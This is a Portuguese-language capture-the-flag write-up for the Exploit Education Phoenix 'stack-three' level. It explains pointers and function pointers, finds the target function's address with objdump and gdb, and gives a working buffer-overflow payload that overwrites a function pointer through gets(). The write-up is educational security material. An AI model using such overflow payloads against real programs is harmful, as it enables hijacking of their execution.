# Objetivo
Usar um pointer para retornar para uma função pre existente

# Dica
OBS: em Ingles! -> [Wikipedia Pointer](https://en.wikipedia.org/wiki/Pointer_(computer_programming))

# Explicação
  - O que raios são pointers
  - Function pointers
  - Exploit
  
### O que raios são pointers
> Pointers são uma estrutura que, ao invés de armazenar dados, armazena o endereço de outra estrutura.
Lembra do exemplo do poço? Que cada item tinha seu endereço na stack! Então, um pointer armazena esse endereço! :D

O pointer pode ser visto como uma placa na estrada, indicando que X cidade está em Y direção.

![Imagem da wikipedia mostrando um pointer](https://upload.wikimedia.org/wikipedia/commons/thumb/b/b4/Pointers.svg/264px-Pointers.svg.png)
Colunas: Nome da Variavel | Endereço | conteúdo

A variável "a" é um pointer que armazena a localização da variavel "b". Coloquialmente se diz que: "a" está apontando para "b" (seta vermelha).
> "a" armazena uma referencia á "b" !

> "a" pode ser des-referenciada, isto é: Seguir a direção que "a" aponta, para chegar no valor de "b" ! :D

Normalmente, o caractere "&" indica uma referência, e o caractere "*" desreferencia aquele pointer.

> Caso você tente desrefenciar um pointer que não aponta pra nada (NULL), o programa vai interromper a execução e soltar uma mensagem de erro!

### Function Pointers
> Function pointers, ao envés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D
Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por varios métodos:
```
objdump -d <programa> | grep <nome_da_função>


gdb <programa>
  (gdb)> info functions
```
Os dois metodos serão demonstrados em breve! :D

### Exploit
> Buffer overflow, alterarando o valor de um function pointer, redirecionando a execução do programa.
Em lingua não nerd, por favor? :P
> Escrever fora do valor do buffer. O valor que sera corrompido indica aonde a execução do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!

#### Analisando o programa
```
função complete_level() {   -> a função que a gente quer chamar
.......
}

função main() {
  criar buffer[64]
  criar fp -> um function pointer
  
  fp = NULL -> vai ser usado para checar se ele foi alterado,
                se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) -> função INSEGURA para abrir um input, salva o valor no buffer
  
  if (fp) {    -> se fp foi alterado
    fp()   -> chama o endereço salvo em fp como se fosse uma função
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
```

Nós queremos chamar complete_level(), para isso, faremos fp salvar o seu endereço.

E nós já sabemos como exploitar um gets()! Então tá na hora do trabalho!

#### Encontrando o endereço da função
```
objdump -d    -> Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereços!
gdb           -> Da uma olhada nessa colinha [ainda não fiz, ops :( ](https://github.com/0xturazzi/Writeups/tree/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7) 
```

objdump
```
user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d <complete_level>:
```

gdb
```
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padrão foram removidas -----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              -> Mesmo endereço
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

> O endereço da função é 0x000000000040069d ! :D
Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes, 
e strings terminam com null byte!
Impedindo atacantes (nós), de definir um pointer novo. Nós precisamos usar um que já esta na memoria! (  Spoiler hehehehe :D  )

Como nesse desafio o pointer ja definido e nós só vamos dar um valor para ele, não precisamos nos preocupar com isso,
 dado que os zeros que ficam na stack quando ela esta vazia completarão o endereço pra gente!

#### Cansei de teoria eu quero exploit

Se você quer tentar por conta propria, agora é sua hora de brilhar!
```
Lembretes: Little Endian, o buffer tem 64 bytes, b"\x", o input vem pelo gets(), python > python3
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
```

b"A"*64     # encher o buffer

b"\x9d\x06\x40" # 0x40069d vira "9d 06 40" em LE


Espero que você tenha gostado! :D

# Solução
```
user@phoenix-amd64:~$ python -c "print(b'A'*64 + b'\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
